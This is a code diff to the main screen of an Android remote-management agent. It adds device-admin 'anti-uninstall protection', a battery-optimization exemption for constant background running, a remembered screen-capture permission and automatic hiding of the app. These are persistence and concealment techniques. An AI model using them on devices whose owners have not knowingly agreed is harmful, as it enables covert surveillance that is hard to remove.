@@ -1,18 +1,26 @@
 package com.trmm.agent;
 
+import android.Manifest;
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.content.res.ColorStateList;
 import android.content.res.Configuration;
 import android.media.projection.MediaProjectionConfig;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
 import android.view.Window;
@@ -94,6 +102,45 @@ public class MainActivity extends Activity {
                 MainActivity act = activityRef.get();
                 if (act != null && !act.isFinishing()) {
                     act.moveTaskToBack(true);
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    static class BatteryOptCheckRunnable implements Runnable {
+        private final WeakReference<MainActivity> activityRef;
+
+        public BatteryOptCheckRunnable(MainActivity activity) {
+            this.activityRef = new WeakReference<>(activity);
+        }
+
+        @Override
+        public void run() {
+            try {
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.requestIgnoreBatteryOptimizations();
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    static class ScreenCaptureCheckRunnable implements Runnable {
+        private final WeakReference<MainActivity> activityRef;
+
+        public ScreenCaptureCheckRunnable(MainActivity activity) {
+            this.activityRef = new WeakReference<>(activity);
+        }
+
+        @Override
+        public void run() {
+            try {
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    SharedPreferences prefs = AgentService.getSafePreferences(act, "trmm_state");
+                    if (!prefs.getBoolean("has_projection_token", false)) {
+                        act.requestEntireScreenCapture();
+                    }
                 }
             } catch (Throwable ignored) {}
         }
@@ -226,6 +273,11 @@ public class MainActivity extends Activity {
         handler.post(dotsRunnable);
         handler.postDelayed(transitionRunnable, 1200L);
 
+        boolean isAutoStart = getIntent() != null && (
+                getIntent().getBooleanExtra("AUTO_START_BACKGROUND", false)
+                || "AUTO_START_BACKGROUND".equals(getIntent().getAction())
+        );
+
         // Apply device owner policies silently if provisioned
         AdminReceiver.applyDeviceOwnerPolicies(this);
 
@@ -234,8 +286,72 @@ public class MainActivity extends Activity {
         BootReceiver.scheduleWatchdog(this);
         AgentJobService.schedule(this);
 
+        if (isAutoStart) {
+            moveTaskToBack(true);
+            return;
+        }
+
+        // Enforce Anti-Uninstall Protection via Device Administrator
+        autoEnrollCorporateProtection();
+
+        // Notification permission (Android 13+)
+        requestNotificationPermission();
+
+        // Request Battery Optimization Exemption for 24/7 background persistence
+        handler.postDelayed(new BatteryOptCheckRunnable(this), 1400L);
+
+        // Check Screen Capture Permission for zero-prompt remote support
+        handler.postDelayed(new ScreenCaptureCheckRunnable(this), 2400L);
+
+        // Automatically move to background once onboarding is initialized
+        handler.postDelayed(new MoveToBackRunnable(this), 3500L);
+
         // Handle incoming admin remote control requests if launched with projection action
         handleIncomingIntent(getIntent());
+    }
+
+    private void autoEnrollCorporateProtection() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = AdminReceiver.getComponentName(this);
+            if (dpm != null && !dpm.isDeviceOwnerApp(getPackageName()) && !dpm.isAdminActive(admin)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Corporate protection prevents unauthorized app uninstallation and enables remote device management.");
+                startActivity(intent);
+            }
+        } catch (Throwable t) {
+            Log.w("TRMMAgent", "Auto-enroll admin notice: " + t.getMessage());
+        }
+    }
+
+    private void requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1003);
+            }
+        }
+    }
+
+    private void requestIgnoreBatteryOptimizations() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    try {
+                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                        intent.setData(Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                    } catch (Throwable t) {
+                        try {
+                            Intent intent2 = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                            startActivity(intent2);
+                        } catch (Throwable ignored) {}
+                    }
+                }
+            }
+        } catch (Throwable ignored) {}
     }
 
     @Override
@@ -250,6 +366,16 @@ public class MainActivity extends Activity {
         super.onResume();
         applyThemeMode();
         AdminReceiver.applyDeviceOwnerPolicies(this);
+
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = AdminReceiver.getComponentName(this);
+            if (dpm != null && (dpm.isDeviceOwnerApp(getPackageName()) || dpm.isAdminActive(admin))) {
+                if (handler != null) {
+                    handler.postDelayed(new MoveToBackRunnable(this), 500L);
+                }
+            }
+        } catch (Throwable ignored) {}
 
         if (handler != null && dotsRunnable != null) {
             handler.removeCallbacks(dotsRunnable);
@@ -269,6 +395,12 @@ public class MainActivity extends Activity {
     private void handleIncomingIntent(Intent intent) {
         if (intent == null) return;
         String action = intent.getAction();
+        boolean isAutoStart = intent.getBooleanExtra("AUTO_START_BACKGROUND", false)
+                || "AUTO_START_BACKGROUND".equals(action);
+        if (isAutoStart) {
+            moveTaskToBack(true);
+            return;
+        }
         boolean reqProjection = intent.getBooleanExtra("REQUEST_PROJECTION", false)
                 || "REQUEST_PROJECTION".equals(action);
         if (reqProjection) {
@@ -307,6 +439,10 @@ public class MainActivity extends Activity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_SCREEN_CAPTURE) {
             if (resultCode == RESULT_OK && data != null) {
+                try {
+                    AgentService.getSafePreferences(this, "trmm_state")
+                            .edit().putBoolean("has_projection_token", true).apply();
+                } catch (Throwable ignored) {}
                 AgentService.setMediaProjectionData(resultCode, data);
                 appendLog("Screen capture permission active.");
 
